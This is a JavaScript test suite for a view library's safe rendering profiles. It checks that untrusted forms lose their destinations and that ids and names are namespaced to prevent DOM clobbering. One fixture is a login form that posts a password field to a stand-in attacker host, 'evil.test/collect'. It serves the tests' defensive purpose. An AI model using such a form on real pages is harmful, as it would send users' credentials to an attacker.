//@ts-check
/**
 * @file Both safe profiles keep an untrusted document inside itself when it
 * renders in the host's page without a frame:
 *  - no form submission leaves its control: a form's destination and a
 *    submitter's override are dropped, and every form is `method="dialog"`,
 *    which sends nothing anywhere;
 *  - every id it declares, and every id reference it makes, lives in the
 *    render's namespace (`idPrefix`, default `jaren-u-`), so its references
 *    resolve among its own elements and none reaches, or shadows, the host's;
 *    `name` on the elements that become `document` properties is namespaced
 *    the same way.
 * Each is pinned on the DOM renderer and the serializer, which must agree.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { createDomRenderer, renderToString } from '@jarenjs/view';

import { createStubHost } from './dom.stub.js';
import { childMarkup } from './interactive-corpus.js';

const PROFILES = /** @type {const} */ ([true, 'interactive']);

/**
 * Render on both renderers under one profile; the markup must agree.
 * @param {any} vnode
 * @param {Record<string, any>} options
 */
function both(vnode, options) {
  /** @type {string[]} */
  const ssrSeen = [];
  /** @type {string[]} */
  const domSeen = [];
  const html = renderToString(vnode, { ...options, onUnsafe: (i) => ssrSeen.push(`${i.kind}:${i.name}`) });
  const { document, container } = createStubHost();
  createDomRenderer(container, { document, ...options, onUnsafe: (i) => domSeen.push(`${i.kind}:${i.name}`) })(vnode);
  assert.equal(childMarkup(container), html, 'DOM and SSR agree');
  assert.deepEqual([...domSeen].sort(), [...ssrSeen].sort(), 'DOM and SSR report alike');
  return { html, seen: [...ssrSeen].sort(), container };
}

describe('safe profiles — no form submission leaves the document', () => {
  const LOGIN = ['form', { action: 'https://evil.test/collect', method: 'post', target: '_top', enctype: 'multipart/form-data', class: 'login' },
    ['input', { type: 'password', name: 'pw', autocomplete: 'current-password' }],
    ['button', { formaction: 'https://evil.test/', formmethod: 'post', formtarget: '_blank', formenctype: 'text/plain', formnovalidate: true, type: 'submit' }, 'Go'],
    ['input', { type: 'submit', formAction: 'https://evil.test/', FORMMETHOD: 'get' }]];

  for (const safe of PROFILES) {
    it(`drops every destination and makes the form a dialog form (safe: ${JSON.stringify(safe)})`, () => {
      const { html, seen } = both(LOGIN, { safe });
      assert.equal(html, '<form method="dialog" class="login"><input type="password" name="pw" autocomplete="current-password">'
        + '<button type="submit">Go</button><input type="submit"></form>');
      assert.deepEqual(seen, ['prop:FORMMETHOD', 'prop:action', 'prop:enctype', 'prop:formAction', 'prop:formaction',
        'prop:formenctype', 'prop:formmethod', 'prop:formnovalidate', 'prop:formtarget', 'prop:method', 'prop:target']);
    });
  }

  it('keeps method="dialog" through patches that try to change it, and on a form widget host', () => {
    const { document, container } = createStubHost();
    const render = createDomRenderer(container, { document, safe: true });
    render(['form', {}, 'a']);
    render(['form', { method: 'post', action: 'https://evil.test/' }, 'b']);
    render(['form', {}, 'c']);
    assert.equal(childMarkup(container), '<form method="dialog">c</form>');
    const widgets = { box: { mount() {}, ssr: () => 'x' } };
    const options = { safe: 'interactive', widgets, capabilities: { widgets: ['box'] } };
    const widget = ['jaren-widget', { name: 'box', tag: 'form', action: 'https://evil.test/' }];
    assert.equal(renderToString(widget, options), '<form method="dialog">x</form>');
    const host = createStubHost();
    createDomRenderer(host.container, { document: host.document, ...options })(widget);
    assert.equal(childMarkup(host.container), '<form method="dialog"></form>');
  });

  it('keeps action and target where they are not a form destination, as before', () => {
    // `target` on a link is a navigation target, not a submission
    assert.equal(both(['a', { href: 'https://x.test/', target: '_blank' }, 'x'], { safe: true }).html,
      '<a href="https://x.test/" target="_blank">x</a>');
  });

  it('leaves trusted rendering alone', () => {
    assert.equal(renderToString(['form', { action: '/save', method: 'post' }, ['button', { formaction: '/other' }, 'x']]),
      '<form action="/save" method="post"><button formaction="/other">x</button></form>');
  });
});

describe('safe profiles — ids and references live in the render\'s namespace', () => {
  const DOC = ['div', {},
    ['label', { for: 'x' }, 'Name'], ['input', { id: 'x', list: 'opts', form: 'f', 'aria-describedby': 'hint x', 'aria-activedescendant': 'x' }],
    ['datalist', { id: 'opts' }], ['form', { id: 'f', name: 'cookie' }],
    ['button', { popovertarget: 'pop', commandfor: 'pop', 'aria-controls': 'pop', 'aria-labelledby': ' x  hint ' }, 'open'],
    ['div', { id: 'pop', popover: 'auto' }, 'pop'], ['p', { id: 'hint' }, 'hint'],
    ['a', { href: '#x' }, 'jump'], ['a', { href: '#' }, 'top'], ['a', { href: '/page#x' }, 'other page'],
    ['table', {}, ['tbody', {}, ['tr', {}, ['th', { id: 'h' }, 'H'], ['td', { headers: 'h' }, 'v']]]],
    ['img', { src: '/a.png', name: 'forms', usemap: '#m', alt: 'a' }],
  ];

  for (const safe of PROFILES) {
    it(`prefixes each id and rewrites each reference to it the same way (safe: ${JSON.stringify(safe)})`, () => {
      const { html } = both(DOC, { safe });
      assert.equal(html, '<div><label for="jaren-u-x">Name</label>'
        + '<input id="jaren-u-x" list="jaren-u-opts" form="jaren-u-f" aria-describedby="jaren-u-hint jaren-u-x" aria-activedescendant="jaren-u-x">'
        + '<datalist id="jaren-u-opts"></datalist><form method="dialog" id="jaren-u-f" name="jaren-u-cookie"></form>'
        + '<button popovertarget="jaren-u-pop" commandfor="jaren-u-pop" aria-controls="jaren-u-pop" aria-labelledby="jaren-u-x jaren-u-hint">open</button>'
        + '<div id="jaren-u-pop" popover="auto">pop</div><p id="jaren-u-hint">hint</p>'
        + '<a href="#jaren-u-x">jump</a><a href="#">top</a><a href="/page#x">other page</a>'
        + '<table><tbody><tr><th id="jaren-u-h">H</th><td headers="jaren-u-h">v</td></tr></tbody></table>'
        + '<img src="/a.png" name="jaren-u-forms" usemap="#jaren-u-m" alt="a"></div>');
    });
  }

  it('resolves every reference to the document\'s element and none to the host\'s element of the same id', () => {
    const { document, container } = createStubHost();
    const hostX = document.createElement('input');
    hostX.setAttribute('id', 'x');
    const page = document.createElement('body');
    page.appendChild(hostX);
    page.appendChild(container);
    createDomRenderer(container, { document, safe: 'interactive' })(DOC);
    const walk = (node) => [node, ...(node.childNodes ?? []).flatMap(walk)];
    const byId = (id) => walk(page).filter((node) => node.getAttribute?.('id') === id);
    const root = container.childNodes[0];
    const references = [
      root.childNodes[0].getAttribute('for'),
      root.childNodes[4].getAttribute('popovertarget'),
      ...root.childNodes[1].getAttribute('aria-describedby').split(' '),
      ...root.childNodes[4].getAttribute('aria-labelledby').split(' '),
      root.childNodes[7].getAttribute('href').slice(1),
    ];
    for (const id of references) {
      const targets = byId(id);
      assert.equal(targets.length, 1, `${id} resolves to exactly one element`);
      assert.ok(walk(container).includes(targets[0]), `${id} resolves inside the document`);
      assert.notEqual(targets[0], hostX);
    }
    assert.deepEqual(byId('x'), [hostX], 'the host keeps its own #x');
  });

  it('namespaces url(#id) in SVG references and inline style', () => {
    const svg = ['svg', {}, ['defs', {}, ['linearGradient', { id: 'g' }], ['clipPath', { id: 'c' }], ['marker', { id: 'm' }]],
      ['rect', { fill: 'url(#g)', 'clip-path': 'url( "#c" )', 'marker-end': 'url(#m)', stroke: 'red', style: 'stroke: url(\'#g\')' }],
      ['path', { style: { fill: 'url(#g)', stroke: 'blue' } }], ['use', { href: '#g' }]];
    for (const safe of PROFILES) {
      assert.equal(both(svg, { safe }).html, '<svg><defs><linearGradient id="jaren-u-g"></linearGradient><clipPath id="jaren-u-c"></clipPath>'
        + '<marker id="jaren-u-m"></marker></defs><rect fill="url(#jaren-u-g)" clip-path="url( &quot;#jaren-u-c&quot; )" marker-end="url(#jaren-u-m)" stroke="red" style="stroke: url(\'#jaren-u-g\')"></rect>'
        + '<path style="fill:url(#jaren-u-g);stroke:blue"></path><use href="#jaren-u-g"></use></svg>');
    }
  });

  it('takes a host-supplied prefix, the same on both renderers', () => {
    for (const safe of PROFILES) {
      const { html } = both(['label', { for: 'x', id: 'x' }, 'x'], { safe, idPrefix: 'tenant7-' });
      assert.equal(html, '<label for="tenant7-x" id="tenant7-x">x</label>');
    }
  });

  it('refuses a prefix that is not a plain token, on both renderers', () => {
    for (const idPrefix of ['', '7x', 'a b', 'a#', 'a"', 'x)', 3, null]) {
      const { document, container } = createStubHost();
      assert.throws(() => createDomRenderer(container, { document, safe: true, idPrefix }), TypeError, String(idPrefix));
      assert.throws(() => renderToString(['p', {}], { safe: 'interactive', idPrefix }), TypeError, String(idPrefix));
    }
  });

  it('namespaces name where it would become a document property, and leaves a control\'s name alone', () => {
    for (const safe of PROFILES) {
      assert.equal(both(['div', {}, ['form', { name: 'forms' }, ['input', { name: 'pw' }]], ['img', { name: 'cookie', src: '/a.png' }]], { safe }).html,
        '<div><form method="dialog" name="jaren-u-forms"><input name="pw"></form><img name="jaren-u-cookie" src="/a.png"></div>');
    }
  });

  it('leaves a value that declares no id as it is', () => {
    assert.equal(renderToString(['p', { id: '', 'aria-labelledby': '  ', for: true }, 'x'], { safe: true }), '<p id="" aria-labelledby="  " for>x</p>');
    assert.equal(both(['p', { id: 7 }, 'x'], { safe: true }).html, '<p id="jaren-u-7">x</p>');
  });

  it('rewrites a reference on a later frame too, and the hydrated DOM matches the serializer with the same prefix', () => {
    const { document, container } = createStubHost();
    const render = createDomRenderer(container, { document, safe: 'interactive', idPrefix: 'p-' });
    render(['label', { for: 'a' }, 'x']);
    render(['label', { for: 'b' }, 'x']);
    assert.equal(childMarkup(container), '<label for="p-b">x</label>');
    assert.equal(childMarkup(container), renderToString(['label', { for: 'b' }, 'x'], { safe: 'interactive', idPrefix: 'p-' }));
  });

  it('leaves trusted rendering alone', () => {
    assert.equal(renderToString(['label', { for: 'x', id: 'y' }, ['a', { href: '#x' }, 'go']]), '<label for="x" id="y"><a href="#x">go</a></label>');
  });
});

describe('safe profiles — each live root of a page has its own default namespace', () => {
  const A = ['div', {}, ['input', { id: 'name' }], ['p', { id: '2-name' }, 'a']];
  const B = ['div', {}, ['label', { for: 'name' }, 'Name'], ['input', { id: 'name', 'aria-describedby': 'hint' }], ['p', { id: 'hint' }, 'h']];
  const walk = (node) => [node, ...(node.childNodes ?? []).flatMap(walk)];

  /** Two containers in one page of one stub document. */
  function page() {
    const { document, container: a } = createStubHost();
    const b = document.createElement('div');
    const body = document.createElement('body');
    body.appendChild(a);
    body.appendChild(b);
    const byId = (id) => walk(body).filter((node) => node.getAttribute?.('id') === id);
    return { document, a, b, body, byId };
  }

  for (const safe of PROFILES) {
    it(`gives a second root the next namespace, so its references reach only its own elements (safe: ${JSON.stringify(safe)})`, () => {
      const { document, a, b, byId } = page();
      createDomRenderer(a, { document, safe })(A);
      createDomRenderer(b, { document, safe })(B);
      // the first root renders what the serializer writes, byte for byte
      assert.equal(childMarkup(a), renderToString(A, { safe }));
      assert.equal(childMarkup(a), '<div><input id="jaren-u-name"><p id="jaren-u-2-name">a</p></div>');
      assert.equal(childMarkup(b), '<div><label for="jaren-u2-name">Name</label>'
        + '<input id="jaren-u2-name" aria-describedby="jaren-u2-hint"><p id="jaren-u2-hint">h</p></div>');
      const label = b.childNodes[0].childNodes[0];
      assert.deepEqual(byId(label.getAttribute('for')), [b.childNodes[0].childNodes[1]]);
      // the first root's `2-name` cannot spell the second root's `name`
      assert.equal(byId('jaren-u-2-name').length, 1);
      assert.equal(byId('jaren-u2-name').length, 1);
    });
  }

  it('keeps a root\'s namespace across frames, a new renderer on the same container, and frees it on destroy', () => {
    const { document, a, b } = page();
    const first = createDomRenderer(a, { document, safe: true });
    first(A);
    const second = createDomRenderer(b, { document, safe: true });
    second(['p', { id: 'x' }, '1']);
    second(['p', { id: 'x' }, '2']);
    assert.equal(childMarkup(b), '<p id="jaren-u2-x">2</p>');
    // a new renderer on the same container (its content replaced) keeps the namespace
    const third = createDomRenderer(b, { document, safe: true });
    third(['p', { id: 'x' }, '3']);
    assert.equal(childMarkup(b), '<p id="jaren-u2-x">3</p>');
    // unmount then mount: the namespace is free again for the next root
    first.destroy();
    const c = document.createElement('div');
    createDomRenderer(c, { document, safe: true })(['p', { id: 'x' }, 'c']);
    assert.equal(childMarkup(c), '<p id="jaren-u-x">c</p>');
    first.destroy(); // idempotent: frees nothing it no longer holds
    const d = document.createElement('div');
    createDomRenderer(d, { document, safe: true })(['p', { id: 'x' }, 'd']);
    assert.equal(childMarkup(d), '<p id="jaren-u3-x">d</p>');
    // a new renderer on a container keeps its namespace even when a lower one is free
    third.destroy();
    createDomRenderer(d, { document, safe: true })(['p', { id: 'x' }, 'd2']);
    assert.equal(childMarkup(d), '<p id="jaren-u3-x">d2</p>');
  });

  it('lets the claim of a root taken out of the page without destroy() lapse, so the next roots do not drift', () => {
    const { document, a, b, body } = page();
    for (const node of [a, b]) Object.defineProperty(node, 'isConnected', { get: () => node.parentNode === body });
    createDomRenderer(a, { document, safe: true })(['p', { id: 'x' }, 'a']);
    createDomRenderer(b, { document, safe: true })(['p', { id: 'x' }, 'b']);
    assert.equal(childMarkup(b), '<p id="jaren-u2-x">b</p>');
    body.removeChild(a);
    const c = document.createElement('div');
    createDomRenderer(c, { document, safe: true })(['p', { id: 'x' }, 'c']);
    assert.equal(childMarkup(c), '<p id="jaren-u-x">c</p>');
    // a connected root keeps its claim
    const d = document.createElement('div');
    createDomRenderer(d, { document, safe: true })(['p', { id: 'x' }, 'd']);
    assert.equal(childMarkup(d), '<p id="jaren-u3-x">d</p>');
  });

  it('takes a host prefix as given, never refused, and lets it occupy its namespace', () => {
    const { document, a, b } = page();
    createDomRenderer(a, { document, safe: true, idPrefix: 'jaren-u-' })(['p', { id: 'x' }, 'a']);
    createDomRenderer(b, { document, safe: 'interactive' })(['p', { id: 'x' }, 'b']);
    assert.equal(childMarkup(a), '<p id="jaren-u-x">a</p>');
    assert.equal(childMarkup(b), '<p id="jaren-u2-x">b</p>');
    // two roots the host gave one prefix share it, as asked
    const c = document.createElement('div');
    const d = document.createElement('div');
    createDomRenderer(c, { document, safe: true, idPrefix: 't-' })(['p', { id: 'x' }, 'c']);
    createDomRenderer(d, { document, safe: true, idPrefix: 't-' })(['p', { id: 'x' }, 'd']);
    assert.equal(childMarkup(c) + childMarkup(d), '<p id="t-x">c</p><p id="t-x">d</p>');
  });

  it('renders two documents without ids, roots of other documents and trusted roots as before', () => {
    const { document, a, b } = page();
    createDomRenderer(a, { document })(['p', { id: 'host' }, 'trusted']);
    createDomRenderer(b, { document, safe: true })(['p', { class: 'x' }, 'b']);
    const c = document.createElement('div');
    createDomRenderer(c, { document, safe: true })(['p', { class: 'x' }, 'c']);
    assert.equal(childMarkup(a) + childMarkup(b) + childMarkup(c), '<p id="host">trusted</p><p class="x">b</p><p class="x">c</p>');
    const other = createStubHost();
    createDomRenderer(other.container, { document: other.document, safe: true })(['p', { id: 'x' }, 'o']);
    assert.equal(childMarkup(other.container), '<p id="jaren-u-x">o</p>');
  });

  it('hands a granted widget its root\'s namespace, and hydrates the first root the serializer wrote', () => {
    const { document, a, b } = page();
    /** @type {string[]} */
    const prefixes = [];
    const widgets = { box: { mount: (_host, _props, _emit, context) => { prefixes.push(context.idPrefix); } } };
    const options = { document, safe: /** @type {const} */ ('interactive'), widgets, capabilities: { widgets: ['box'] } };
    const vnode = ['div', {}, ['p', { id: 'x' }, 'x'], ['jaren-widget', { name: 'box' }]];
    a.appendChild(document.createElement('div'));
    createDomRenderer(a, { ...options, hydrate: true })(vnode);
    createDomRenderer(b, options)(vnode);
    assert.deepEqual(prefixes, ['jaren-u-', 'jaren-u2-']);
    assert.equal(childMarkup(a), renderToString(vnode, { safe: 'interactive', widgets, capabilities: { widgets: ['box'] } }));
  });
});

describe('safe profiles — a prefixed id the page already holds outside the root is reported, never refused', () => {
  const walk = (node) => [node, ...(node.childNodes ?? []).flatMap(walk)];

  /** A page whose stub document answers `getElementById` (first in tree order), a host element first. */
  function page(hostId = 'jaren-u-name') {
    const { document, container: a } = createStubHost();
    const body = document.createElement('body');
    const host = document.createElement('p');
    host.setAttribute('id', hostId);
    body.appendChild(host);
    body.appendChild(a);
    const b = document.createElement('div');
    body.appendChild(b);
    Object.assign(document, { getElementById: (id) => walk(body).find((node) => node.getAttribute?.('id') === id) ?? null });
    return { document, a, b };
  }

  for (const safe of PROFILES) {
    it(`reports a host element inside the namespace once, and writes the ids as before (safe: ${JSON.stringify(safe)})`, () => {
      const { document, a } = page();
      /** @type {any[]} */
      const seen = [];
      const render = createDomRenderer(a, { document, safe, onUnsafe: (info) => seen.push(info) });
      const vnode = ['div', {}, ['label', { for: 'name' }, 'Name'], ['input', { id: 'name' }]];
      render(vnode);
      // a new element under the same id, and the same frame again
      render(['div', {}, ['label', { for: 'name' }, 'Name'], ['input', { key: 'k', id: 'name' }]]);
      render(['section', { id: 'name' }]);
      assert.deepEqual(seen, [{ kind: 'id', name: 'jaren-u-name' }]);
      assert.equal(childMarkup(a), '<section id="jaren-u-name"></section>');
    });
  }

  it('reports nothing for the root\'s own ids, a second default root, host ids outside the namespace, trusted roots, or a page without lookup', () => {
    /** @type {any[]} */
    const seen = [];
    const onUnsafe = (/** @type {any} */ info) => seen.push(info);
    const own = page();
    const render = createDomRenderer(own.a, { document: own.document, safe: true, onUnsafe });
    // replaced while the old element still holds the id, then patched, then repeated
    render(['p', { id: 'x' }, '1']);
    render(['div', { id: 'x' }, '2']);
    render(['div', { id: 'y' }, '3']);
    render(['div', {}, ['p', { id: 'y' }], ['p', { id: 'y' }]]);
    // a second default root declaring the first one's ids takes its own namespace
    createDomRenderer(own.b, { document: own.document, safe: true, onUnsafe })(['div', { id: 'y' }]);
    assert.equal(childMarkup(own.b), '<div id="jaren-u2-y"></div>');
    // the host's ids outside every namespace
    const outside = page('name');
    createDomRenderer(outside.a, { document: outside.document, safe: 'interactive', onUnsafe })(['input', { id: 'name' }]);
    // a trusted root writes the id as given and is not a safe root
    const trusted = page();
    createDomRenderer(trusted.a, { document: trusted.document, onUnsafe })(['input', { id: 'jaren-u-name' }]);
    // a document without getElementById, and a root without onUnsafe
    const { document, container } = createStubHost();
    createDomRenderer(container, { document, safe: true, onUnsafe })(['input', { id: 'name' }]);
    const quiet = page();
    createDomRenderer(quiet.a, { document: quiet.document, safe: true })(['input', { id: 'name' }]);
    assert.equal(childMarkup(quiet.a), '<input id="jaren-u-name">');
    assert.deepEqual(seen, []);
  });

  it('counts the content a granted widget renders in the root\'s namespace as the root\'s own, and still reports the host\'s holder from it', () => {
    const { document, a } = page();
    /** @type {string[]} */
    const seen = [];
    const widgets = {
      box: {
        mount(/** @type {any} */ host, /** @type {any} */ props, /** @type {any} */ _emit, /** @type {any} */ context) {
          const inner = createDomRenderer(host, { document, safe: context.safe, widgets: context.widgets, capabilities: context.capabilities,
            idPrefix: context.idPrefix, onUnsafe: context.onUnsafe });
          inner(props.content);
          return inner;
        },
        update(/** @type {any} */ inner, /** @type {any} */ props) { inner(props.content); },
        unmount(/** @type {any} */ inner) { inner.destroy(); },
      },
    };
    const render = createDomRenderer(a, { document, safe: 'interactive', widgets, capabilities: { widgets: ['box'] },
      onUnsafe: (i) => seen.push(`${i.kind}:${i.name}`) });
    const box = (/** @type {any} */ content) => ['jaren-widget', { name: 'box', props: { content } }];
    // the content declares the root's id, then the id moves into the content in one frame
    render(['div', {}, ['p', { id: 'x' }], box(['p', { id: 'x' }])]);
    render(['div', {}, box(['p', {}]), ['p', { id: 'y' }]]);
    render(['div', {}, box(['p', { id: 'y' }]), ['p', {}]]);
    assert.deepEqual(seen, []);
    // the host's own element is still a holder for the content
    render(['div', {}, box(['p', { id: 'name' }])]);
    assert.deepEqual(seen, ['id:jaren-u-name']);
  });

  it('reports an id patched in on a connected element when the page holds it after the root', () => {
    const { document, container: a } = createStubHost();
    const body = document.createElement('body');
    body.appendChild(a);
    const host = document.createElement('p');
    host.setAttribute('id', 'jaren-u-z');
    body.appendChild(host);
    Object.assign(document, { getElementById: (id) => walk(body).find((node) => node.getAttribute?.('id') === id) ?? null });
    /** @type {string[]} */
    const seen = [];
    const render = createDomRenderer(a, { document, safe: true, onUnsafe: (i) => seen.push(`${i.kind}:${i.name}`) });
    render(['p', { id: 'y' }]);
    const node = a.childNodes[0];
    render(['p', { id: 'z' }]);
    assert.equal(a.childNodes[0], node);
    assert.deepEqual(seen, ['id:jaren-u-z']);
  });

  it('reports the second of two roots the host gave one prefix when both declare an id', () => {
    const { document, a, b } = page('host');
    /** @type {string[]} */
    const seen = [];
    createDomRenderer(a, { document, safe: true, idPrefix: 't-', onUnsafe: (i) => seen.push(`a ${i.kind}:${i.name}`) })(['p', { id: 'x' }]);
    createDomRenderer(b, { document, safe: true, idPrefix: 't-', onUnsafe: (i) => seen.push(`b ${i.kind}:${i.name}`) })(['p', { id: 'x' }]);
    assert.deepEqual(seen, ['b id:t-x']);
    assert.equal(childMarkup(a) + childMarkup(b), '<p id="t-x"></p><p id="t-x"></p>');
  });

  it('serializes two documents into one page apart under the prefixes the host gives, and their roots render them alike', () => {
    const { document, a, b } = page('host');
    const A = ['div', {}, ['label', { for: 'name' }, 'A'], ['input', { id: 'name' }]];
    const B = ['div', {}, ['label', { for: 'name' }, 'B'], ['input', { id: 'name' }]];
    const htmlA = renderToString(A, { safe: true, idPrefix: 'doc-a-' });
    const htmlB = renderToString(B, { safe: 'interactive', idPrefix: 'doc-b-' });
    assert.equal(htmlA, '<div><label for="doc-a-name">A</label><input id="doc-a-name"></div>');
    assert.equal(htmlB, '<div><label for="doc-b-name">B</label><input id="doc-b-name"></div>');
    /** @type {string[]} */
    const seen = [];
    createDomRenderer(a, { document, safe: true, idPrefix: 'doc-a-', hydrate: true, onUnsafe: (i) => seen.push(i.name) })(A);
    createDomRenderer(b, { document, safe: 'interactive', idPrefix: 'doc-b-', hydrate: true, onUnsafe: (i) => seen.push(i.name) })(B);
    assert.equal(childMarkup(a), htmlA);
    assert.equal(childMarkup(b), htmlB);
    // a default root beside them keeps the first default namespace
    const c = document.createElement('div');
    createDomRenderer(c, { document, safe: true })(['p', { id: 'name' }]);
    assert.equal(childMarkup(c), '<p id="jaren-u-name"></p>');
    assert.deepEqual(seen, []);
  });
});

describe('safe profiles — a prefixed name the page already holds on a named element outside the root is reported, never refused', () => {
  const walk = (/** @type {any} */ node) => [node, ...(node.childNodes ?? []).flatMap(walk)];
  const NAMED = new Set(['form', 'img', 'embed', 'object', 'iframe']);

  /**
   * A page whose stub document answers the renderer's one scan of named
   * elements, holding host elements before the root and after it.
   * @param {Array<[string, string]>} before - [tag, name] host elements before the root
   * @param {Array<[string, string]>} [after] - and after it
   */
  function page(before, after = []) {
    const { document, container: a } = createStubHost();
    const body = document.createElement('body');
    const hostOf = ([tag, name]) => {
      const node = document.createElement(tag);
      node.setAttribute('name', name);
      return node;
    };
    for (const entry of before) body.appendChild(hostOf(entry));
    body.appendChild(a);
    for (const entry of after) body.appendChild(hostOf(entry));
    /** @type {string[]} */
    const scans = [];
    Object.assign(document, {
      querySelectorAll(/** @type {string} */ selector) {
        scans.push(selector);
        return walk(body).filter((node) => NAMED.has(node.tagName) && node.getAttribute?.('name') != null);
      },
    });
    return { document, a, body, scans };
  }

  for (const safe of PROFILES) {
    it(`reports a host form and img holding a prefixed name once, after the pass, in one scan (safe: ${JSON.stringify(safe)})`, () => {
      const { document, a, scans } = page([['form', 'jaren-u-f'], ['img', 'jaren-u-logo'], ['input', 'jaren-u-q']],
        [['img', 'jaren-u-late'], ['form', 'jaren-u-f']]);
      /** @type {any[]} */
      const seen = [];
      const render = createDomRenderer(a, { document, safe, onUnsafe: (info) => seen.push(info) });
      const vnode = (/** @type {string} */ src) => ['div', {}, ['form', { name: 'f' }], ['img', { name: 'logo', src }],
        ['input', { name: 'q' }], ['img', { name: 'late' }], ['img', { name: 'own' }], ['img', { name: 'own' }]];
      render(vnode('a.png'));
      assert.deepEqual(seen, [{ kind: 'name', name: 'jaren-u-f' }, { kind: 'name', name: 'jaren-u-logo' }, { kind: 'name', name: 'jaren-u-late' }]);
      assert.deepEqual(scans, ['form[name], img[name], embed[name], object[name], iframe[name]']);
      // a frame writing no name scans nothing; a frame renaming one scans once and reports nothing twice
      render(vnode('b.png'));
      assert.equal(scans.length, 1);
      render(['div', {}, ['form', { name: 'f' }], ['img', { name: 'logo2' }]]);
      assert.equal(scans.length, 2);
      assert.equal(seen.length, 3);
      assert.equal(childMarkup(a), '<div><form method="dialog" name="jaren-u-f"></form><img name="jaren-u-logo2"></div>');
    });
  }

  it('reports nothing for an input holding the name, the root\'s own names, an SVG element, trusted roots, or a page without lookup', () => {
    /** @type {any[]} */
    const seen = [];
    const onUnsafe = (/** @type {any} */ info) => seen.push(info);
    // an empty name is no property of document either, beside a page element holding one
    const empty = page([['img', '']]);
    createDomRenderer(empty.a, { document: empty.document, safe: true, onUnsafe })(['img', { name: '' }]);
    assert.deepEqual(empty.scans, []);
    // an input's name is no property of document
    const input = page([['input', 'jaren-u-f']]);
    const inputs = createDomRenderer(input.a, { document: input.document, safe: true, onUnsafe });
    // a pass writing only an input's name, which lands on no document property, scans nothing
    inputs(['input', { name: 'f' }]);
    assert.deepEqual(input.scans, []);
    inputs(['form', { name: 'f' }]);
    // the root's own named elements, replaced while the old one holds the name
    const own = page([]);
    const render = createDomRenderer(own.a, { document: own.document, safe: 'interactive', onUnsafe });
    render(['img', { name: 'x' }]);
    render(['form', { name: 'x' }]);
    // an element of a named tag in the SVG namespace lands on no document property
    const svg = page([]);
    const foreign = svg.document.createElementNS('http://www.w3.org/2000/svg', 'img');
    foreign.setAttribute('name', 'jaren-u-x');
    svg.body.appendChild(foreign);
    createDomRenderer(svg.a, { document: svg.document, safe: true, onUnsafe })(['img', { name: 'x' }]);
    // a trusted root writes the name as given
    const trusted = page([['img', 'jaren-u-x']]);
    createDomRenderer(trusted.a, { document: trusted.document, onUnsafe })(['img', { name: 'jaren-u-x' }]);
    // a document without querySelectorAll, and a root without onUnsafe
    const { document, container } = createStubHost();
    createDomRenderer(container, { document, safe: true, onUnsafe })(['img', { name: 'x' }]);
    const quiet = page([['img', 'jaren-u-x']]);
    createDomRenderer(quiet.a, { document: quiet.document, safe: true })(['img', { name: 'x' }]);
    assert.equal(childMarkup(quiet.a), '<img name="jaren-u-x">');
    assert.deepEqual(quiet.scans, []);
    assert.deepEqual(seen, []);
  });

  it('counts a granted widget\'s content in the root\'s namespace as the root\'s own, and a pass that throws scans nothing', () => {
    const { document, a, scans } = page([['form', 'jaren-u-host']]);
    /** @type {string[]} */
    const seen = [];
    const widgets = {
      box: {
        mount(/** @type {any} */ host, /** @type {any} */ props, /** @type {any} */ _emit, /** @type {any} */ context) {
          const inner = createDomRenderer(host, { document, safe: context.safe, widgets: context.widgets, capabilities: context.capabilities,
            idPrefix: context.idPrefix, onUnsafe: context.onUnsafe });
          inner(props.content);
          return inner;
        },
        update(/** @type {any} */ inner, /** @type {any} */ props) { inner(props.content); },
        unmount(/** @type {any} */ inner) { inner.destroy(); },
      },
    };
    // a host sink that throws on a stripped tag throws the pass that reports it
    const render = createDomRenderer(a, { document, safe: 'interactive', widgets, capabilities: { widgets: ['box'] },
      onUnsafe: (i) => { if (i.kind === 'tag') throw new Error('sink'); seen.push(`${i.kind}:${i.name}`); } });
    const box = (/** @type {any} */ content) => ['jaren-widget', { name: 'box', props: { content } }];
    render(['div', {}, ['img', { name: 'x' }], box(['img', { name: 'x' }])]);
    assert.deepEqual(seen, []);
    render(['div', {}, box(['form', { name: 'host' }])]);
    assert.deepEqual(seen, ['name:jaren-u-host']);
    // a pass that throws part-way leaves no written name for the next pass to look up
    const before = scans.length;
    assert.throws(() => render(['div', {}, ['img', { name: 'y' }], ['script', {}]]), { message: 'sink' });
    render(['p', {}]);
    assert.equal(scans.length, before);
  });
});
